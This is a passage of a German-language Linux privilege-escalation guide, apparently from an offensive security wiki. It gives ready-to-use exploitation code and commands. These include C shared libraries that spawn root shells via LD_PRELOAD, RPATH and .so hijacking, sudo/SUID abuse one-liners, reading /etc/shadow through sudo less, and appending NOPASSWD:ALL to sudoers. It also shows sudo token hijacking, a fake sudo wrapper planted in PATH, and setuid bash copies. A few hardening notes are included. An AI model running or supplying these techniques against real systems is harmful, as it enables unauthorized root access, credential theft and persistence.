If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ist ein ausgeklügeltes interprozessuales Kommunikationssystem (IPC), das Anwendungen ermöglicht, effizient miteinander zu interagieren und Daten auszutauschen. Für moderne Linux-Systeme konzipiert, bietet es ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegendes IPC, das den Datenaustausch zwischen Prozessen verbessert, ähnlich wie **enhanced UNIX domain sockets**. Außerdem unterstützt es das Senden von Events oder Signalen und fördert so die nahtlose Integration von Systemkomponenten. Beispielsweise kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Music-Player stummschalten und so das Nutzererlebnis verbessern. Zusätzlich unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenaufrufe zwischen Anwendungen vereinfacht und zuvor komplexe Prozesse strafft.

D-Bus arbeitet nach einem **allow/deny model** und verwaltet Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen etc.) basierend auf der kumulativen Wirkung passender Policy-Regeln. Diese Richtlinien legen fest, wie mit dem Bus interagiert werden darf und können potentiell zur Privilegieneskalation ausgenutzt werden, wenn Berechtigungen missbraucht werden.

Ein Beispiel einer solchen Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` zeigt Berechtigungen für den root-Benutzer, um `fi.w1.wpa_supplicant1` zu besitzen, an ihn zu senden und Nachrichten von ihm zu empfangen.

Richtlinien ohne angegebenen Benutzer oder Gruppe gelten universell, während "default"-Kontext-Richtlinien für alle gelten, die nicht durch andere spezifische Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lerne hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine zu bestimmen.

### Allgemeine enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Überprüfe immer die Netzwerkdienste, die auf der Maschine laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du traffic sniffen kannst. Wenn ja, könntest du einige credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Allgemeine Enumeration

Prüfe, wer du bist, welche Privilegien du hast, welche Benutzer im System sind, welche sich einloggen können und welche root-Rechte besitzen:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Überprüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung kennst, **versuche dich als jeden Benutzer mit diesem Passwort anzumelden**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu erzeugen und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer zu brute-forcen.

## Missbrauch schreibbarer $PATHs

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, könntest du möglicherweise Privilegien eskalieren, indem du **eine backdoor in dem schreibbaren Ordner erstellst** mit dem Namen eines Kommandos, das von einem anderen Benutzer (idealerweise root) ausgeführt wird und das **nicht aus einem Ordner geladen wird, der in $PATH vor deinem schreibbaren Ordner liegt**.

### SUDO und SUID

Du könntest berechtigt sein, ein Kommando mit sudo auszuführen, oder sie könnten das suid-Bit gesetzt haben. Prüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Manche **unerwarteten Befehle erlauben es, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne dessen Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen, es ist nun trivial, eine Shell zu erhalten, indem man einen ssh key ins root directory hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, **eine environment variable zu setzen**, während er etwas ausführt:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf HTB machine Admirer**, war **vulnerable** gegenüber **PYTHONPATH hijacking**, um eine beliebige python-Bibliothek zu laden, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV beibehalten durch sudo env_keep → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du das nicht-interaktive Startverhalten von Bash ausnutzen, um beliebigen Code als root auszuführen, wenn du einen erlaubten Befehl aufrufst.

- Warum das funktioniert: Für nicht-interaktive shells wertet Bash `$BASH_ENV` aus und sourced diese Datei, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Rechten gesourced.

- Voraussetzungen:
- Eine sudo-Regel, die du ausführen kannst (jedes Ziel, das `/bin/bash` nicht-interaktiv aufruft, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`; verwende stattdessen `env_reset`.
- Vermeide Shell-Wrapper für sudo erlaubte Befehle; nutze minimale Binaries.
- Ziehe sudo I/O-Protokollierung und Alarmierung in Betracht, wenn beibehaltene env vars verwendet werden.

### Pfade zur Umgehung von sudo-Ausführung

**Springe**, um andere Dateien zu lesen oder verwende **Symlinks**. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn eine **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne angegebenen Befehls-Pfad

Wenn die **sudo permission** für ein einzelnes Kommando erteilt wird **ohne den Pfad anzugeben**: _hacker10 ALL= (root) less_ kann man dies ausnutzen, indem man die PATH-Variable ändert.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid**-Binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt eines seltsamen SUID-Binaries)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mit Angabe des Befehls-Pfads

Wenn das **suid**-Binary **einen anderen Befehl mit Angabe des Pfads ausführt**, dann kannst du versuchen, eine **Funktion zu erstellen und zu exportieren**, die denselben Namen trägt wie der Befehl, den die suid-Datei aufruft.

Zum Beispiel, wenn ein suid-Binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn du dann das suid binary aufrufst, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD**-Umgebungsvariable wird verwendet, um eine oder mehrere Shared Libraries (.so Dateien) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Vorausladen einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion missbraucht wird, insbesondere bei **suid/sgid**-Executables, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die real user ID (_ruid_) nicht mit der effective user ID (_euid_) übereinstimmt.
- Bei Executables mit **suid/sgid** werden nur Libraries in Standardpfaden vorausgeladen, die ebenfalls **suid/sgid** sind.

Privilege escalation kann auftreten, wenn du die Möglichkeit hast, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Aussage **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt es, dass die **LD_PRELOAD**-Umgebungsvariable auch bei Ausführung von Befehlen mit `sudo` bestehen bleibt und erkannt wird, was potenziell zur Ausführung von beliebigem Code mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichern als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH env variable** kontrolliert, da er so den Pfad bestimmt, in dem nach Bibliotheken gesucht wird.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn Sie auf ein Binary mit **SUID**-Rechten stoßen, das ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich mit folgendem Befehl überprüfen:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein mögliches exploitation-Potenzial hin.

Um dies auszunutzen, erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, mit folgendem Inhalt:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code versucht, nach dem Kompilieren und Ausführen Privilegien zu erhöhen, indem er Dateiberechtigungen manipuliert und eine shell mit erhöhten Privilegien ausführt.

Kompilieren Sie die obige C-Datei in eine Shared-Object (.so)-Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen der betroffenen SUID binary den exploit auslösen und eine mögliche Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die library in diesem Verzeichnis mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die von dir erstellte Bibliothek eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind- und reverse-shells zu erzeugen und andere post-exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du `sudo -l` ausführen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es einen Weg findet, eine sudo-Regel auszunutzen.

### Wiederverwendung von Sudo-Tokens

In Fällen, in denen du **Sudo-Zugriff** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Befehls wartest und dann das Session-Token kaperst**.

Voraussetzungen, um Privilegien zu eskalieren:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um in den **letzten 15 Minuten** etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` zu benutzen, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt die Binary `activate_sudo_token` in _/tmp_. Du kannst sie verwenden, um **das sudo-Token in deiner Session zu aktivieren** (du erhältst nicht automatisch eine Root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, die **im Besitz von root ist und setuid hat**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **third exploit** (`exploit_v3.sh`) wird **create a sudoers file**, die **sudo tokens eternal and allows all users to use sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **Schreibberechtigungen** in dem Ordner oder auf einer der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **einen sudo token für einen user und PID zu erstellen**.\
Zum Beispiel, wenn du die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser user mit PID 1234 hast, kannst du **sudo privileges** erhalten, ohne das Passwort zu kennen, indem du:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und von der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du in irgendeine Datei **schreiben** kannst, wirst du **escalate privileges** können.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn Sie Schreibzugriff haben, können Sie diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen auszunutzen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo`-Binary, wie z. B. `doas` für OpenBSD. Denk daran, dessen Konfiguration in `/etc/doas.conf` zu überprüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein Benutzer normalerweise eine Maschine verbindet und `sudo` verwendet, um Privilegien zu eskalieren, und du eine Shell im Kontext dieses Benutzers erhalten hast, kannst du **ein neues sudo executable erstellen**, das zuerst deinen Code als root ausführt und danach den Befehl des Benutzers. Dann **ändere den $PATH** des Benutzerkontexts (zum Beispiel durch Hinzufügen des neuen Pfads in .bash_profile), sodass beim Ausführen von sudo durch den Benutzer dein sudo executable ausgeführt wird.

Beachte, dass, wenn der Benutzer eine andere shell (nicht bash) verwendet, du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel [sudo-piggyback](https://github.com/APTy/sudo-piggyback) ändert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Eintrag: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien unter `/etc/ld.so.conf.d/*.conf` eingelesen werden. Diese Konfigurationsdateien **weisen auf andere Verzeichnisse** hin, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Falls aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, einer Datei innerhalb von `/etc/ld.so.conf.d/` oder einem Ordner, auf den in einer der Dateien in `/etc/ld.so.conf.d/*.conf` verwiesen wird, könnte er Privilegien eskalieren.\  
Siehe **wie man diese Fehlkonfiguration ausnutzt** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch Kopieren der lib nach `/var/tmp/flag15/` wird sie vom Programm an dieser Stelle verwendet, wie in der Variable `RPATH` angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erzeuge dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Fähigkeiten

Linux capabilities stellen einem Prozess eine **Teilmenge der verfügbaren root-Privilegien** zur Verfügung. Dies unterteilt die root-**Privilegien effektiv in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann unabhängig Prozessen gewährt werden. Auf diese Weise wird die gesamte Menge an Privilegien reduziert, wodurch das Risiko einer Exploitation sinkt.\  
Lies die folgende Seite, um **mehr über capabilities und wie man sie ausnutzen kann** zu erfahren:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis impliziert das **Bit für "execute"**, dass der betroffene Benutzer in das Verzeichnis **cd**-en kann.\  
Das **"read"**-Bit impliziert, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"**-Bit impliziert, dass der Benutzer **Dateien löschen** und **neue Dateien erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene diskretionärer Berechtigungen dar, die in der Lage ist, die traditionellen ugo/rwx-Berechtigungen zu **überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Feinabstimmung sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details finden sich [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Hole** Dateien mit spezifischen ACLs aus dem System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise einige **shell** sessions eines anderen Benutzers (**root**) **hijack**.\
In **neuesten Versionen** kannst du dich nur noch zu screen sessions **deines eigenen Benutzers** **connect**. Allerdings könntest du **interessante Informationen innerhalb der session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem mit **old tmux versions**. Ich konnte eine von root erstellte tmux (v2.1) session als nicht-privilegierter Benutzer nicht hijacken.

**tmux sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box von HTB** für ein Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Keys, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, könnten von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erstellen eines neuen ssh-Schlüssels auf diesen OS auf, da **nur 32,768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn man den ssh public key hat, kann man nach dem entsprechenden private key suchen**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Gibt an, ob die Passwortauthentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwortauthentifizierung erlaubt ist, gibt es an, ob der Server Logins für Konten mit leerem Passwort erlaubt. Der Standard ist `no`.

### PermitRootLogin

Gibt an, ob root sich per ssh einloggen kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und private key einloggen
- `without-password` oder `prohibit-password`: root kann sich nur mit einem private key einloggen
- `forced-commands-only`: root kann sich nur mit private key einloggen und nur, wenn die command-Optionen angegeben sind
- `no`: nein

### AuthorizedKeysFile

Gibt Dateien an, die die public keys enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **private** key des Benutzers "**testusername**" einzuloggen, ssh den public key, der zu deinem key gehört, mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem Server liegen zu lassen. Dadurch wirst du in der Lage sein, **jump** via ssh **to a host** und von dort **jump to another** host **using** den **key** located in your **initial host**.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer auf eine andere Maschine wechselt, dieser Host Zugriff auf die Keys erhält (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann **erlauben** oder **verweigern** ssh-agent forwarding mit dem keyword `AllowAgentForwarding` (default is allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profile-Dateien

